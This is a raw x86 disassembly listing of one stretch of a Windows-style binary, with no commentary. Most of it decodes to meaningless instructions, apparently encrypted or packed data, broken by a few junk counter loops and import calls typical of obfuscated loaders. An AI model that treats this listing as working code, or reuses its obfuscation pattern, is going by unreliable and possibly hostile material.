  403fe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fea:	cmp    ecx,ebp
  403fec:	repnz aad 0x53
  403fef:	inc    esp
  403ff0:	push   esi
  403ff1:	sti    
  403ff2:	test   BYTE PTR [esi],al
  403ff4:	popf   
  403ff5:	jb     0x404046
  403ff7:	sti    
  403ff8:	adc    ebx,DWORD PTR [edx+0xdf536ea]
  403ffe:	adc    al,0xe8
  404000:	call   0x3438:0xfbe9d142
  404007:	xchg   BYTE PTR [esi+0x4ce0b081],dh
  40400d:	imul   eax,DWORD PTR [ebx+0x7af79df8],0xffffff90
  404014:	je     0x404076
  404016:	inc    ebx
  404017:	out    dx,eax
  404018:	cmp    ebp,DWORD PTR [si-0x1f1a]
  40401d:	mov    al,ds:0x982594f0
  404022:	add    ebx,edx
  404024:	popa   
  404025:	inc    ebp
  404026:	(bad)  
  404027:	sub    al,0xa
  404029:	inc    esp
  40402a:	xchg   ebx,eax
  40402b:	push   eax
  40402c:	mov    al,0x70
  40402e:	mov    DWORD PTR [ebp+edx*1+0x318e2c05],esp
  404035:	inc    ebp
  404036:	sub    BYTE PTR [ecx-0x65],bh
  404039:	nop
  40403a:	fnstenv [edi-0x4e]
  40403d:	mov    ebx,0x5f3351df
  404042:	fld    TBYTE PTR [esi-0x1715f173]
  404048:	out    0x36,eax
  40404a:	adc    BYTE PTR [eax],bh
  40404c:	push   0x3a5f3d25
  404051:	xor    al,0x73
  404053:	enter  0x4ebd,0x49
  404057:	mov    eax,ds:0xa1626048
  40405c:	mov    ah,0xd4
  40405e:	in     al,dx
  40405f:	fistp  QWORD PTR [ecx]
  404061:	pop    esp
  404062:	mov    edi,DWORD PTR [ebx-0x4e]
  404065:	push   ds
  404066:	add    eax,edi
  404068:	pop    es
  404069:	ret    0x1100
  40406c:	bound  ebx,QWORD PTR [ebx-0x7330b034]
  404072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404073:	cmp    DWORD PTR [ebp-0x6a],edi
  404076:	xor    esi,DWORD PTR [ecx+0x4dbf8073]
  40407c:	and    edx,esi
  40407e:	sbb    al,0x3d
  404080:	inc    edi
  404081:	mov    ds:0x76d85b41,al
  404086:	mov    esp,DWORD PTR [edx-0x3267d0a5]
  40408c:	add    DWORD PTR [edx],0x73aa14f5
  404092:	adc    DWORD PTR [eax],0x6d
  404095:	inc    eax
  404096:	adc    DWORD PTR [esi-0x67527ea6],eax
  40409c:	mov    eax,ds:0x5ea13fc7
  4040a1:	loope  0x404027
  4040a3:	repnz mov cl,0x53
  4040a6:	(bad)  
  4040a8:	xchg   edx,eax
  4040a9:	adc    bh,BYTE PTR [ebx+eiz*8+0x5e60622c]
  4040b0:	xchg   ebp,eax
  4040b1:	shr    BYTE PTR [edi-0x5c68b3f4],0x84
  4040b8:	dec    eax
  4040b9:	push   ecx
  4040ba:	xor    DWORD PTR [edx-0x63],ebp
  4040bd:	xor    DWORD PTR [ebp-0xc],0x5fd8e
  4040c4:	jmp    0x404380
  4040c9:	mov    eax,DWORD PTR [ebp-0x8]
  4040cc:	mov    ecx,DWORD PTR [ebp-0x18]
  4040cf:	mov    ecx,DWORD PTR [ecx]
  4040d1:	jmp    0x404370
  4040d6:	aas    
  4040d7:	leave  
  4040d8:	enter  0xdac9,0xd9
  4040dc:	fxch   st(1)
  4040de:	mov    eax,0xeef7e6c1
  4040e3:	sub    BYTE PTR ds:0x78269e66,ah
  4040e9:	js     0x4040e9
  4040eb:	jle    0x404165
  4040ed:	js     0x404140
  4040ef:	retf   0x6337
  4040f2:	inc    ebx
  4040f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4040f4:	pop    eax
  4040f5:	enter  0x94ed,0xd
  4040f9:	or     cl,BYTE PTR ds:0x2786d071
  4040ff:	retf   
  404100:	add    edx,DWORD PTR [esi-0x7d]
  404103:	sub    edi,DWORD PTR [edx+edx*2]
  404106:	add    BYTE PTR [ebx],ah
  404108:	xor    bh,BYTE PTR [ecx-0x2f]
  40410b:	push   0x1a
  40410d:	dec    esi
  40410e:	inc    esp
  40410f:	mov    ebx,0xd56aabfa
  404114:	push   eax
  404115:	cli    
  404116:	push   cs
  404117:	outs   dx,DWORD PTR ds:[esi]
  404118:	mov    edx,0xdf899b85
  40411d:	jo     0x4040bb
  40411f:	rcl    BYTE PTR [esi],cl
  404121:	cmp    bh,BYTE PTR [ecx-0x1f]
  404124:	push   es
  404125:	(bad)  
  404127:	ss popf 
  404129:	ret    0x67de
  40412c:	fwait
  40412d:	push   0x8d3c6034
  404132:	adc    eax,0x38932630
  404137:	inc    ebp
  404138:	stc    
  404139:	js     0x4040fa
  40413b:	mov    eax,ds:0xb3ba113a
  404140:	xchg   ecx,eax
  404141:	push   cs
  404142:	ins    BYTE PTR es:[edi],dx
  404143:	(bad)  
  404144:	arpl   WORD PTR [edx-0x451e7bb4],bp
  40414a:	rcl    DWORD PTR [edi],1
  40414c:	imul   ecx
  40414e:	sahf   
  40414f:	add    DWORD PTR [eax+0x75586f36],ebx
  404155:	pop    es
  404156:	xchg   esp,eax
  404157:	and    BYTE PTR [ebp+0x369229a3],0xe8
  40415e:	(bad)  
  40415f:	in     al,0x88
  404161:	jne    0x404120
  404163:	xor    DWORD PTR [edx+0x19],edx
  404166:	popa   
  404167:	cvtps2pd xmm6,QWORD PTR ds:0x66c40e78
  40416e:	push   ecx
  40416f:	xchg   esi,eax
  404170:	sbb    eax,0x87752425
  404175:	or     dl,BYTE PTR [esi]
  404177:	lock popa 
  404179:	jae    0x4041f7
  40417b:	data16 fwait
  40417d:	cld    
  40417e:	test   BYTE PTR [edi-0x7a9dbef],cl
  404184:	stos   BYTE PTR es:[edi],al
  404185:	pop    ss
  404186:	push   es
  404187:	xchg   esi,eax
  404188:	push   ds
  404189:	xchg   ebx,eax
  40418a:	xor    esp,DWORD PTR [esi]
  40418c:	out    dx,al
  40418d:	xchg   esi,eax
  40418e:	(bad)
  404192:	cmp    ebp,ebp
  404194:	mov    ch,0xfc
  404196:	push   ds
  404197:	iret   
  404198:	add    bh,dl
  40419a:	loopne 0x404143
  40419c:	mov    ?,WORD PTR [ecx+0x170a010b]
  4041a2:	lds    edi,FWORD PTR [ebp+0x5a7bf2df]
  4041a8:	dec    ebx
  4041a9:	jno    0x40412e
  4041ab:	sti    
  4041ac:	repz sti 
  4041ae:	lods   eax,DWORD PTR ds:[esi]
  4041af:	push   0x3a48d5ae
  4041b4:	jae    0x4041c2
  4041b6:	push   0xffffff81
  4041b8:	shl    edi,0xe0
  4041bb:	xor    ecx,DWORD PTR [edi+0x22ecface]
  4041c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041c2:	aad    0x2d
  4041c4:	inc    ebx
  4041c5:	aas    
  4041c6:	mov    cl,0x4a
  4041c8:	xchg   edi,eax
  4041c9:	(bad)  
  4041cb:	jnp    0x40421a
  4041cd:	jecxz  0x4041ee
  4041cf:	push   eax
  4041d0:	ss mov cx,0x6648
  4041d5:	dec    DWORD PTR [ebp+0xe21ceed]
  4041db:	fmul   DWORD PTR [eax]
  4041dd:	ror    DWORD PTR ds:0x50fd72a2,1
  4041e3:	jge    0x404174
  4041e5:	mov    edx,0x3ebd8863
  4041ea:	fs stc 
  4041ec:	scas   eax,DWORD PTR es:[edi]
  4041ed:	out    dx,al
  4041ee:	fld    TBYTE PTR [ebp-0x3ac44df5]
  4041f4:	or     al,0x95
  4041f6:	mov    ds:0xce1691b9,eax
  4041fb:	sbb    ah,BYTE PTR [ecx]
  4041fd:	dec    ebx
  4041fe:	je     0x404270
  404200:	stos   DWORD PTR es:[edi],eax
  404201:	jle    0x40422b
  404203:	cmc    
  404204:	add    BYTE PTR [edx-0x6c],dl
  404207:	rol    DWORD PTR [ebx],1
  404209:	fidivr WORD PTR [ebx]
  40420b:	xchg   esp,eax
  40420c:	push   DWORD PTR [ecx]
  40420e:	jno    0x404206
  404210:	push   eax
  404211:	jno    0x4041c6
  404213:	fsub   st(5),st
  404215:	xchg   ebp,eax
  404216:	adc    ebx,DWORD PTR [ecx-0xc166218]
  40421c:	hlt    
  40421d:	outs   dx,DWORD PTR ds:[esi]
  40421e:	sbb    eax,0x2e07caf4
  404223:	pusha  
  404224:	dec    edx
  404225:	sbb    eax,0xb49d896e
  40422a:	rcl    esp,cl
  40422c:	test   eax,esi
  40422e:	inc    ebx
  40422f:	fstp   QWORD PTR [edi]
  404231:	js     0x4041ce
  404233:	leave  
  404234:	(bad)  
  404235:	outs   dx,BYTE PTR ds:[esi]
  404236:	push   0xf95caa98
  40423b:	jns    0x40428c
  40423d:	push   ecx
  40423e:	mov    es,WORD PTR [ebp-0x33c624e6]
  404244:	int    0x1a
  404246:	push   es
  404247:	retfw  
  404249:	test   dh,dh
  40424b:	das    
  40424c:	push   esi
  40424d:	fnsave [ebx+0x3a]
  404250:	outs   dx,DWORD PTR ds:[esi]
  404251:	ja     0x40423b
  404253:	inc    eax
  404254:	add    eax,0xcb376ec2
  404259:	pop    ecx
  40425a:	sub    DWORD PTR [esi],esp
  40425c:	outs   dx,BYTE PTR ds:[esi]
  40425d:	hlt    
  40425e:	dec    esi
  40425f:	cs jb  0x4042c3
  404262:	loop   0x404215
  404264:	out    dx,eax
  404265:	jle    0x404226
  404267:	pop    ebx
  404268:	add    DWORD PTR [edi-0x7e02c2cd],ebx
  40426e:	pop    ebp
  40426f:	popa   
  404270:	fs ins DWORD PTR es:[edi],dx
  404272:	sub    ecx,ecx
  404274:	jne    0x404213
  404276:	loop   0x404269
  404278:	or     al,0xe3
  40427a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40427b:	(bad)  
  40427c:	xor    ch,cl
  40427e:	sbb    eax,0x5b81f58d
  404283:	ins    DWORD PTR es:[edi],dx
  404284:	out    0xac,al
  404286:	dec    ecx
  404287:	sbb    ebx,DWORD PTR [esp+eax*4]
  40428a:	test   DWORD PTR [ebx+ebp*4-0x5c4a5a44],0x1503d9ac
  404295:	loope  0x4042a6
  404297:	in     eax,dx
  404298:	test   BYTE PTR [eax+0x7dd3c76c],bh
  40429e:	inc    esi
  40429f:	mov    cl,0xfc
  4042a1:	sbb    eax,0xd4f1e962
  4042a6:	dec    edx
  4042a7:	push   eax
  4042a8:	gs in  eax,dx
  4042aa:	jmp    0xc5e5:0xeb594d89
  4042b1:	pop    edx
  4042b2:	out    dx,eax
  4042b3:	test   eax,0x794b1ab6
  4042b8:	fwait
  4042b9:	(bad)  
  4042ba:	and    DWORD PTR ds:[edx+ebp*4-0x735389c1],edi
  4042c2:	rol    DWORD PTR [esi+0x7df14823],1
  4042c8:	pusha  
  4042c9:	mov    ch,0x97
  4042cb:	repnz add bh,BYTE PTR [esi+ebx*2+0x37]
  4042d0:	jmp    edx
  4042d2:	rol    bh,0x3f
  4042d5:	ret    
  4042d6:	pushf  
  4042d7:	mov    ?,WORD PTR [esi+0x58]
  4042da:	ffreep st(0)
  4042dc:	jb     0x404288
  4042de:	push   ebx
  4042df:	rol    DWORD PTR [esi],1
  4042e1:	inc    edx
  4042e2:	cmp    al,0x5c
  4042e4:	push   esi
  4042e5:	test   DWORD PTR [esi],0x3b6dcbb1
  4042eb:	ja     0x4042ac
  4042ed:	cmp    eax,0x560ab68f
  4042f2:	jl     0x4042d2
  4042f4:	cmc    
  4042f5:	ficomp DWORD PTR [ebp+0x7abc7a42]
  4042fb:	test   DWORD PTR [edx-0x2942550e],edi
  404301:	cs (bad) 
  404303:	cmp    BYTE PTR [esi+ebx*8+0x38b8bc50],bh
  40430a:	test   al,0x74
  40430c:	push   ds
  40430d:	cmp    eax,0xc2dd586a
  404312:	mov    al,0x6d
  404314:	xchg   esi,eax
  404315:	or     eax,0xf215ad45
  40431a:	xor    ebp,DWORD PTR [edi]
  40431c:	cmp    eax,0xe2ff4c92
  404321:	ins    BYTE PTR es:[edi],dx
  404322:	inc    edi
  404323:	clc    
  404324:	cmp    DWORD PTR [edx],edi
  404326:	(bad)  
  404327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404328:	jnp    0x4042e4
  40432a:	pop    ds
  40432b:	sub    eax,0xdbfe2f89
  404330:	jae    0x4042b5
  404332:	pop    esi
  404333:	mov    DWORD PTR [ebp-0x65b62f5e],0x46db2b86
  40433d:	jle    0x40437f
  40433f:	sbb    al,0x4d
  404341:	mov    esp,0xe30a9a4c
  404346:	sub    al,0x19
  404348:	mov    bl,0xf
  40434a:	(bad)  
  40434b:	out    dx,al
  40434c:	loope  0x40434d
  40434e:	cmc    
  40434f:	stc    
  404350:	inc    ebx
  404351:	neg    DWORD PTR [eax]
  404353:	in     eax,0x7d
  404355:	jge    0x404359
  404357:	(bad)  
  404359:	adc    ch,BYTE PTR [edi-0x578c637c]
  40435f:	and    ah,dh
  404361:	push   ecx
  404362:	mov    DWORD PTR [edi-0x1],esp
  404365:	mov    bl,0xc7
  404367:	cmp    dl,BYTE PTR [ebp-0x1f518969]
  40436d:	fwait
  40436e:	and    DWORD PTR [ecx+0x458b0889],ebp
  404374:	or     al,0x8b
  404376:	inc    ebp
  404377:	or     bh,bh
  404379:	jne    0x404373
  40437b:	call   0x4096cf
  404380:	mov    eax,DWORD PTR [ebp-0xc]
  404383:	cmp    eax,ebx
  404385:	je     0x401faa
  40438b:	mov    eax,DWORD PTR [ebp-0x8]
  40438e:	mov    eax,DWORD PTR [eax]
  404390:	pop    edi
  404391:	pop    esi
  404392:	pop    ebx
  404393:	leave  
  404394:	ret    0xc
  404397:	push   ebp
  404398:	mov    ebp,esp
  40439a:	sub    esp,0x14
  40439d:	leave  
  40439e:	ret    0x4
  4043a1:	push   ebp
  4043a2:	mov    ebp,esp
  4043a4:	push   ecx
  4043a5:	mov    eax,ds:0x42a77d
  4043aa:	add    DWORD PTR ds:0x42a761,eax
  4043b0:	push   ecx
  4043b1:	xor    ecx,0x7913
  4043b7:	mov    eax,0xf89c8538
  4043bc:	and    DWORD PTR ds:0x42a7b5,0x0
  4043c6:	mov    ecx,DWORD PTR ds:0x42a7b5
  4043cc:	inc    ecx
  4043cd:	mov    DWORD PTR ds:0x42a7b5,ecx
  4043d3:	cmp    DWORD PTR ds:0x42a7b5,0x23
  4043da:	jne    0x4043e6
  4043e0:	call   DWORD PTR ds:0x41d240
  4043e6:	cmp    DWORD PTR ds:0x42a7b5,0x15
  4043ed:	jb     0x4043c6
  4043f3:	mov    DWORD PTR [ebp-0x8],eax
  4043f6:	dec    DWORD PTR ds:0x42a845
  4043fc:	mov    DWORD PTR [ebp-0x4],0xf89c8539
  404403:	mov    edx,DWORD PTR [ebp-0x8]
  404406:	not    ecx
  404408:	jmp    0x4046f8
  40440d:	rol    edi,0x3f
  404410:	retf   
  404411:	leave  
  404412:	retf   
  404413:	leave  
  404414:	lds    edx,FWORD PTR [edx]
  404416:	dec    esp
  404417:	inc    ecx
  404418:	ins    BYTE PTR es:[edi],dx
  404419:	xor    al,0xc6
  40441b:	popa   
  40441c:	cmp    al,0x1c
  40441e:	sub    edi,DWORD PTR [eax+0x78]
  404421:	dec    ebp
  404422:	jle    0x40449c
  404424:	js     0x4043c2
  404426:	cmp    BYTE PTR [edi-0x3ae2d7c9],ch
  40442c:	repz mov edx,0x96c7d5a
  404432:	fdiv   DWORD PTR [eax-0x67]
  404435:	les    edi,FWORD PTR [edi]
  404437:	xor    edx,DWORD PTR [esi+0x32]
  40443a:	and    edi,DWORD PTR [eax+0x7f119c19]
  404440:	xor    al,0xc3
  404442:	mov    ah,0xb
  404444:	adc    BYTE PTR [edx+0x32],0x8e
  404448:	or     esi,DWORD PTR [esi+esi*1+0x1b3d2df8]
  40444f:	rcr    BYTE PTR [eax],1
  404451:	ret    0xf604
  404454:	cmp    eax,0x1a380f0c
  404459:	push   edx
  40445b:	shl    BYTE PTR [ebx-0x5d3a677f],0xfa
  404462:	popa   
  404463:	cmp    al,BYTE PTR [ebx-0x19a6a7f3]
  404469:	xchg   ebx,eax
  40446a:	outs   dx,DWORD PTR ds:[esi]
  40446b:	popf   
  40446c:	fdiv   QWORD PTR [edi-0xac7bd33]
  404472:	lock addr16 dec esp
  404475:	into   
  404476:	imul   ebp,DWORD PTR [eax-0x60],0x57bc95d1
  40447d:	jae    0x404493
  40447f:	js     0x404454
  404481:	rcl    BYTE PTR [edi],0xd1
  404484:	fnstenv [ebp-0x1fbeb8bb]
  40448a:	push   es
  40448b:	inc    edx
  40448c:	mov    dl,0x95
  40448e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40448f:	(bad)  
  404490:	outs   dx,DWORD PTR ds:[esi]
  404491:	(bad)  
  404492:	sub    eax,0xba3f522e
  404497:	bound  esi,QWORD PTR [eax]
  404499:	jp     0x4044ab
  40449b:	add    DWORD PTR [edi],esp
  40449d:	or     eax,0xd8aa4695
  4044a2:	push   ds
  4044a3:	pop    es
  4044a4:	outs   dx,BYTE PTR ds:[esi]
  4044a5:	hlt    
  4044a6:	iret   
  4044a7:	push   ecx
  4044a8:	scas   al,BYTE PTR es:[edi]
  4044a9:	push   ds
  4044aa:	imul   esi,DWORD PTR [eax+eax*8-0x72],0xffffffcd
  4044af:	ins    DWORD PTR es:[edi],dx
  4044b0:	xchg   esi,eax
  4044b1:	fldenv [ebp+0x2eb80d96]
  4044b7:	push   esi
  4044b8:	jno    0x4044f4
  4044ba:	adc    al,0x10
  4044bc:	sub    edi,DWORD PTR [eax+eax*8]
  4044bf:	int    0xa
  4044c1:	add    esi,DWORD PTR [eax+0x58873e4]
  4044c7:	xchg   ecx,eax
  4044c8:	mov    al,0x4f
  4044ca:	ret    
  4044cb:	mov    al,0xea
  4044cd:	and    ebx,DWORD PTR [edi-0x1f2075f7]
  4044d3:	repz neg BYTE PTR [ebx]
  4044d6:	cmp    eax,0x8c167df5
  4044db:	xchg   ebp,eax
  4044dc:	scas   al,BYTE PTR es:[edi]
  4044dd:	push   cs
  4044de:	fcom   DWORD PTR [ebp-0x2a9b37a9]
  4044e4:	add    esp,DWORD PTR [ebx]
  4044e6:	push   edx
  4044e7:	aas    
  4044e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044e9:	lods   al,BYTE PTR ds:[esi]
  4044ea:	xor    ch,al
  4044ec:	test   al,0xf6
  4044ee:	or     DWORD PTR [esi-0x7ff7f97a],edx
  4044f4:	xchg   DWORD PTR [ecx-0x31],eax
  4044f7:	fld    QWORD PTR [edi-0x66]
  4044fa:	sub    eax,0xa60766cf
  4044ff:	cmp    DWORD PTR [ecx],ebx
  404501:	sahf   
  404502:	nop
  404503:	cmp    al,0x95
  404505:	jmp    0x1577:0xcb6eaaaa
  40450c:	dec    edx
  40450d:	add    ebx,DWORD PTR [ecx+0x30]
  404510:	add    bh,dl
  404512:	dec    edi
  404513:	dec    esi
  404514:	sti    
  404515:	adc    eax,0x3985dd96
  40451a:	mov    dl,al
  40451c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40451d:	jno    0x404580
  40451f:	xchg   BYTE PTR [eax],bh
  404521:	adc    esp,DWORD PTR [ebx+0x1f]
  404524:	hlt    
  404525:	daa    
  404526:	cmp    ebx,edx
  404528:	add    BYTE PTR [edx],dl
  40452a:	add    cl,BYTE PTR [eax-0x7a]
  40452d:	dec    edx
  40452e:	adc    esi,esp
  404530:	daa    
  404531:	cmp    ch,BYTE PTR [eax+eiz*2-0x14f4596e]
  404538:	mov    cl,0x2a
  40453a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40453b:	jb     0x404518
  40453d:	rcr    BYTE PTR [ebp-0x4f],1
  404540:	xchg   edi,eax
  404541:	mov    WORD PTR [ecx],cs
  404543:	clc    
  404544:	xor    esi,esp
  404546:	enter  0x924c,0x15
  40454a:	sbb    DWORD PTR [ecx],ecx
  40454c:	shl    DWORD PTR [ebx],cl
  40454e:	test   eax,0xfc2d5a4f
  404553:	loop   0x404519
  404555:	pop    esp
  404556:	inc    edi
  404557:	mov    ds:0xb9e8543e,eax
  40455c:	add    DWORD PTR [esi+eax*1+0x23],ebp
  404560:	fdiv   st(5),st
  404562:	fild   WORD PTR [ecx+0x49]
  404565:	call   0x43d7:0x5f9385d1
  40456c:	popa   
  40456d:	mov    ecx,0xc2f3bbbd
  404572:	lea    ebx,[ecx]
  404574:	(bad)  
  404575:	fidiv  DWORD PTR [eax+0x59302fd0]
  40457b:	mov    dh,0x83
  40457d:	fisttp WORD PTR [ebp+0x69]
  404580:	sbb    BYTE PTR [eax-0x5a],dl
  404583:	rcr    BYTE PTR [eax+0x0],cl
  404586:	and    ebp,edi
  404588:	jmp    0x1114:0xf8a00a27
  40458f:	addr16 in al,dx
  404591:	es adc eax,0xb99d86f8
  404597:	mov    ch,0xa0
  404599:	call   0x20ccb204
  40459e:	stc    
  40459f:	pop    edi
  4045a0:	call   esi
  4045a2:	test   al,0x7f
  4045a5:	pushf  
  4045a6:	ret    
  4045a7:	sub    ebx,DWORD PTR [esi]
  4045a9:	inc    ecx
  4045aa:	jns    0x404611
  4045ac:	cmp    ebx,ecx
  4045ae:	xor    bl,dl
  4045b0:	lds    ecx,FWORD PTR ds:[ecx+0x1dde84c5]
  4045b7:	aas    
  4045b8:	dec    ebx
  4045b9:	dec    DWORD PTR [edi*1-0x59f28867]
  4045c0:	xor    cl,al
  4045c2:	push   0x9f8b40fd
  4045c7:	mov    ds:0x79263857,eax
  4045cc:	inc    edi
  4045cd:	adc    eax,0xcd7cedbc
  4045d2:	dec    edx
  4045d3:	adc    bl,BYTE PTR [ecx+edi*8]
  4045d6:	adc    ebp,DWORD PTR [edi-0x1e70a962]
  4045dc:	and    DWORD PTR [edi],esi
  4045de:	shl    BYTE PTR [ecx-0x13],cl
  4045e1:	inc    esp
  4045e2:	test   BYTE PTR [edi],ch
  4045e4:	(bad)  
  4045e5:	push   0x6f
  4045e7:	imul   edi,DWORD PTR [eax],0xffffffe5
  4045ea:	cs out dx,al
  4045ec:	aad    0x35
  4045ee:	outs   dx,DWORD PTR ds:[esi]
  4045ef:	xchg   ebx,eax
  4045f0:	scas   al,BYTE PTR es:[edi]
  4045f1:	imul   ecx,DWORD PTR es:[ebx-0x7e],0xdc0b898b
  4045f9:	jg     0x404605
  4045fb:	adc    dh,BYTE PTR [edx+0x4d]
  4045fe:	call   0x232b:0x28fa7667
  404605:	repz vpsubusb xmm0,xmm1,XMMWORD PTR es:[ebx+ecx*8-0x73cafc5e]
  404610:	dec    edx
  404611:	mov    al,ds:0x7ee2ece1
  404616:	push   ebp
  404617:	dec    esp
  404618:	aam    0xa3
  40461a:	out    dx,eax
  40461b:	or     BYTE PTR [esi-0x5],ch
  40461e:	imul   ebx,ebp,0xa24b8e5b
  404624:	push   0xffffff98
  404626:	sub    al,0xb7
  404628:	sub    bl,BYTE PTR [edi]
  40462a:	xchg   ecx,eax
  40462b:	(bad)  
  40462c:	ins    BYTE PTR es:[edi],dx
  40462d:	test   eax,0x41de1320
  404632:	(bad)  
  404633:	pop    edx
  404634:	mov    ebx,0x33cafcb0
  404639:	mov    ds:0x7a87a2cb,eax
  40463e:	push   ebp
  40463f:	jmp    0x404651
  404641:	jno    0x40464d
  404643:	scas   al,BYTE PTR es:[edi]
  404644:	or     ebp,ebx
  404646:	add    ah,BYTE PTR [ebx+0x44]
  404649:	loop   0x404643
  40464b:	adc    esp,ebx
  40464d:	jnp    0x404684
  40464f:	mov    dl,dl
  404651:	daa    
  404652:	add    BYTE PTR [ebx-0x69d7ec11],ch
  404658:	call   DWORD PTR [eax+eiz*2-0x3c]
  40465c:	push   edi
  40465d:	neg    DWORD PTR [ecx+ebx*4]
  404660:	or     DWORD PTR [ebp+0x32],0xffffffab
  404664:	arpl   WORD PTR [eax],di
  404666:	ins    DWORD PTR es:[edi],dx
  404667:	xor    eax,0xbd0c7c93
  40466c:	shr    BYTE PTR [esi+ecx*8+0x4ccf167e],1
  404673:	je     0x404608
  404675:	push   esp
  404676:	icebp  
  404677:	popf   
  404678:	inc    BYTE PTR [edi]
  40467a:	pop    ebp
  40467b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40467c:	mov    bl,0x7c
  40467e:	sbb    al,0xd6
  404680:	mov    eax,ds:0x8ef1efb2
  404685:	(bad)  
  404686:	sar    edi,cl
  404688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404689:	add    eax,0x132aff2e
  40468e:	push   edi
  40468f:	popf   
  404690:	and    al,0xa9
  404692:	dec    ebp
  404693:	xor    cl,BYTE PTR ds:0x725e16b
  404699:	pop    DWORD PTR [ecx+eiz*8]
  40469c:	add    dh,BYTE PTR [ebx+0x75]
  40469f:	lds    ebp,FWORD PTR ds:0xf989ac81
  4046a5:	cmp    BYTE PTR [esi-0x5f],0x6c
  4046a9:	xor    al,0x90
  4046ab:	jge    0x404644
  4046ad:	test   al,0xaf
  4046af:	inc    edi
  4046b0:	xlat   BYTE PTR ds:[ebx]
  4046b1:	add    cl,BYTE PTR [eax]
  4046b3:	imul   DWORD PTR [edi+0xde6d564]
  4046b9:	cli    
  4046ba:	cmp    DWORD PTR [esi+0x18],esi
  4046bd:	fidivr WORD PTR [ebp-0x3de472ad]
  4046c3:	retf   
  4046c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046c5:	sbb    eax,0x56edbfd3
  4046ca:	adc    BYTE PTR [ebp+0x78460570],bh
  4046d0:	(bad)  
  4046d1:	xchg   edx,eax
  4046d2:	sub    al,0x49
  4046d4:	clc    
  4046d5:	call   0xfd96bd27
  4046da:	jg     0x4046ac
  4046dc:	push   ss
  4046dd:	sub    DWORD PTR [ebp-0x4f0bfd7],ebx
  4046e3:	cmp    al,0x92
  4046e5:	push   ecx
  4046e6:	xor    DWORD PTR [esp+ebp*1+0x3f],edi
  4046ea:	fwait
  4046eb:	push   eax
  4046ec:	and    BYTE PTR [ebp+0x4d0d435b],bl
  4046f2:	fprem  
  4046f4:	push   ebx
  4046f5:	fwait
  4046f6:	daa    
  4046f7:	dec    esp
  4046f8:	push   esi
  4046f9:	and    DWORD PTR ds:0x42a775,0x0
  404703:	jmp    0x404715
  404708:	mov    esi,DWORD PTR ds:0x42a775
  40470e:	inc    esi
  40470f:	mov    DWORD PTR ds:0x42a775,esi
  404715:	cmp    DWORD PTR ds:0x42a775,0x10
  40471c:	jae    0x404a4d
  404722:	cmp    DWORD PTR ds:0x42a775,0x16
  404729:	jne    0x404752
  40472f:	push   DWORD PTR [ebp-0x1c]
  404732:	push   DWORD PTR [ebp-0xc]
  404735:	push   DWORD PTR [ebp-0x18]
  404738:	push   0x42a83d
  40473d:	push   0x2e4d
  404742:	push   0x244d
  404747:	push   0x42aa48
  40474c:	call   DWORD PTR ds:0x41d0c0
  404752:	jmp    0x404708
  404757:	xor    esi,0x7852
  40475d:	jmp    0x404a4d
  404762:	rol    eax,1
  404764:	int3   
  404765:	(bad)  
  404766:	(bad)  
  404768:	(bad)  
  40476a:	pop    esi
  40476b:	test   eax,0x6c883de
  404770:	xchg   ebx,eax
  404771:	jg     0x4047e4
  404773:	sub    DWORD PTR [eax+0x78],edi
  404776:	dec    ebp
  404777:	jle    0x4047f1
  404779:	js     0x404775
  40477b:	pop    ebp
  40477c:	fisttp DWORD PTR [esi+0x61]
  40477f:	xor    dl,BYTE PTR [ecx+0x35d30ca2]
  404785:	inc    ecx
  404786:	fisttp DWORD PTR [edi+eiz*8]
  404789:	addr16 inc edx
  40478b:	outs   dx,BYTE PTR ds:[esi]
  40478c:	push   ss
  40478d:	and    edi,DWORD PTR [esi-0x3f]
  404790:	enter  0x2a74,0xc3
  404794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404795:	out    dx,al
  404796:	xchg   edi,eax
  404797:	outs   dx,BYTE PTR ds:[esi]
  404798:	js     0x40479b
  40479a:	add    al,0x14
  40479c:	popf   
  40479d:	fsubr  DWORD PTR [esi+0x27fafa0c]
  4047a3:	jo     0x40479d
  4047a5:	and    eax,0xc2362c49
  4047aa:	xchg   esi,eax
  4047ab:	sub    BYTE PTR gs:[edx],bh
  4047ae:	ins    DWORD PTR es:[edi],dx
  4047af:	(bad)  
  4047b0:	mov    ah,0x62
  4047b2:	fwait
  4047b3:	push   edi
  4047b4:	xchg   ebp,eax
  4047b5:	mov    fs:0x7213e351,eax
  4047bb:	jl     0x4047f1
  4047bd:	and    al,BYTE PTR [ebp+0x21828746]
  4047c3:	push   es
  4047c4:	out    0x8e,al
  4047c6:	popf   
  4047c7:	cmc    
  4047c8:	adc    DWORD PTR [ebx+eiz*1],ebx
  4047cb:	mov    ds:0x55b376bc,eax
  4047d0:	add    al,0x5e
  4047d2:	cmp    bh,cl
  4047d4:	pop    ebx
  4047d5:	push   cs
  4047d6:	push   0x62182044
  4047db:	iret   
  4047dc:	out    0x93,eax
  4047de:	mov    ebx,0x8919bfef
  4047e3:	fucomi st,st(1)
  4047e5:	lds    esi,FWORD PTR [edx-0x59]
  4047e8:	mov    ds:0x7b110e98,al
  4047ed:	pop    edi
  4047ee:	push   0xffffffb4
  4047f0:	mov    al,0x15
  4047f2:	jns    0x40485c
  4047f4:	mov    ah,0xf5
  4047f6:	push   ecx
  4047f7:	lahf   
  4047f8:	addr16 mov ebp,0xe76f08c6
  4047fe:	loop   0x40486f
  404800:	jbe    0x404840
  404802:	mov    BYTE PTR ds:0xba2efa47,dh
  404808:	push   esp
  404809:	mul    WORD PTR [ecx+0x5e9a1cb6]
  404810:	xlat   BYTE PTR ds:[ebx]
  404811:	pop    ebx
  404812:	outs   dx,DWORD PTR ds:[esi]
  404813:	jle    0x404808
  404815:	sub    DWORD PTR [ebp+0x5be195a7],eax
  40481b:	mov    al,ds:0xf3a65b48
